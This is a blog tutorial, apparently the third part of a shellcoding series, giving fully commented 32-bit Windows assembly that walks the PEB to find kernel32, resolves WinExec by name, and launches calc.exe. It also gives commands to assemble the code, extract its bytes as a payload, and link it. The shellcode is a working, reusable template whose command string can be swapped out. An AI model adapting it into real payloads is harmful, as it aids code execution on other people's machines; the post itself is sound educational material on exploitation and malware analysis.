---
title: Popping a calculator - 32 bit - Part 3/3
date: 2024-03-27
author: retr0ds
author_url: https://twitter.com/_retr0ds_
categories:
  - Reversing
tags:
  - Blog
  - Shellcode
  - Windows
  - Pop_a_calc
  - Series
  
series: ["Shellcoding"]
series_order: 4

---
>
## Writing the Shellcode x86 W32

`32 bit` also goes through the same steps as 64 bits so I woudn't be explaining it in detail rather, I have commented it on the side for you to understand and pick up based on context from x64

```x86!=
xor eax, eax
xor ebx, ebx

mov ebx, [fs:ebx + 0x030]   ; PEB loaded in eax
mov ebx, [ebx + 0x0c]       ; Address of PEB_LDR_Module is loaded (in 32 bit it is at offset 0c)
mov ebx, [ebx + 0x14]       ; Address of InMemoryOrderModuleList is loaded this is pointing to kernelbase.dll
mov ebx, [ebx]              ; Pointing to ntdll's ldr_data_table_entry
mov ebx, [ebx]              ; Pointing to kernel32.dll's ldr_data_table_entry
mov ebx, [ebx + 0x10]       ; Base Address of kernel32.dll is now loaded

;--------------Base address of kernel32dll is now loaded into ebx------------------

push ebp                    ; Storing prev stack base
mov ebp, esp                ; Setting up the base of new stack

sub esp, 18h                ; Setting up the new stack frame (to accomodate for the lack of registers in x64)

xor esi, esi                ; Clearing out esi manually
push esi                    ; To fix the alignment on the stack
push 00636578h              ; "\00cex" is being pushed onto the stack
push 456e6957h              ; "EniW" is being pushed onto the stack
mov [ebp-4], esp            ; WinExec\x00

mov eax, [ebx + 3Ch]        ; RVA of PE signature
add eax, ebx                ; Address of PE signature = base address + RVA of PE Signature
mov eax, [eax + 78h]        ; RVA of Export Table Directory
add eax, ebx                ; Address of Export Table Directory = base address + RVA of Export Table Directory
mov [ebp-08h], eax          ; Address of Export Table direcorty is being moved into ebp-0x8 for future purposes 


mov ecx, [eax + 24h]        ; RVA of Ordinal Table
add ecx, ebx                ; Address of Ordinal Table = base address + RVA of Ordinal Table
mov [ebp-0Ch], ecx          ; Address of Ordinal Table is being moved into ebp-0xC

mov edi, [eax + 20h]        ; RVA of Name Pointer Table
add edi, ebx                ; Address of Name Pointer Table
mov [ebp-10h], edi          ; Address of Name Pointer Table is being moved into ebp-0x10


mov edx, [eax + 1Ch]        ; RVA of Export Address Table
add edx, ebx                ; Address of Export Address Table
mov [ebp-14h], edx          ; Address of Export Address Table is being moved into ebp-0x14

mov edx, [eax + 14h]        ; Number of exported functions is taken at the offset of 0x14 from eax, eax holds the Address of the Export Table Directory

xor ecx, ecx                ; ecx is cleared
mov ecx, 0x7                ; ecx is loaded with the length of "WinExec"


dynamic_api_resolve:

mov edx, esp                ; The last thing we pushed onto the stack was WinExec since which esp has not been changed, so it's address is loaded into edx

push ecx

xor eax, eax                ; eax is cleared to be used as counter
loop:
mov ecx, [esp]              ; Value at esp "WinExec" is loaded into ecx
xor edi, edi                ; edi is cleared
mov edi, [ebp - 10h]        ; Name pointer Table's address is being moved into edi
mov edi, [edi + eax * 4]    ; Each entry inside the name pointer table (RVA of the symbol names) are being loaded one by one into edi
add edi,ebx                 ; Actual Address of the symbol name = RVA of symbol name + base address

mov esi,edx                 ; edx containing the address to string "WinExec" is moved into esi

repe cmpsb                  ; Used to compare strings stored in esi with strings stored in edi byte by byte 
je get_addr                 ; If it is equal we get the actual address of the function
inc eax                     ; If not we increment the counte
jmp loop                    ; Go back to loop in search for the next symbol name


get_addr:                   
xor ecx, ecx                ; ecx is cleared
mov ecx,[ebp-0Ch]           ; Address of Ordinal Table is being loaded from ebp-0xC
mov ax,[ecx + eax * 2]      ; Same counter eax is taken  and multiplied by 2 to account for words(as that is how ordinal table is maintained) and it's added with address of Ordinal Table. This Ordinal Value is stored in ax

xor ecx, ecx                ; ecx is cleared

mov ecx, [ebp - 14h]        ; Address of Export Address Table is loaded into ecx
mov eax, [ecx + eax * 4]    ; And that is now being added with 4 * Ordinal value of the function to get the RVA address of the WinExec function into eax

add eax, ebx                ; Address of the WinExec API = RVA of WinExec + base address 

xor esi, esi                ; esi is cleared
push esi                    ; being pushed onto stack for stakc alignment 

xor ecx, ecx                ; clear ecx register
push ecx                    ; string terminator 0x00 for "calc.exe" string
push 0x6578652e             ; exe. : 6578652e
push 0x636c6163             ; clac : 636c6163
mov ebx, esp                ; save pointer to "calc.exe" string in eax
inc ecx                     ; SW_SHOWNORMAL = 0x00000001 is being set
push ecx                    ; tha is being pushed as the second argument
push ebx                    ; Calc.exe is being pushed as the first argument
call eax                    ; WinExec('calc.exe', 0x1) is called.
```




## Compiling 32 bit

### Source

**[x86 Assembly to pop a calculator](https://github.com/retr0ds/Malware-learning/blob/main/shellcode/pop_calculator/x32/pop_calc_32.asm)**

### Assemble 

To compile the shellcode and get the object file we can use any assembler, I prefer `nasm`:

```bash
nasm -f win32 pop_calc_32.asm -o pop_calc_32.o
```

### Get Payload bytes

This is not necessary to just compile <span style="color: red;">and</span> run the shellcode. But, assuming we want to use this as `payload`, this is the one-liner used to generate the instruction bytes

```bash
for i in $(objdump -D pop_calc_32.o | grep "^ " | cut -f2); do echo -n "\x$i" ; done
```


### Link
Before running this shellcode as such we would requrire `linking`, which can be done by
```bash
ld -m i386pe pop_calc_32.o -o pop_calc_32.exe
```
### To Run
```bash
pop_calc_32.exe
```

# Exit()

That brings us to the end of this blog post. To know more about where to look into how to load shellcode feel free to check out the loading payloads blog.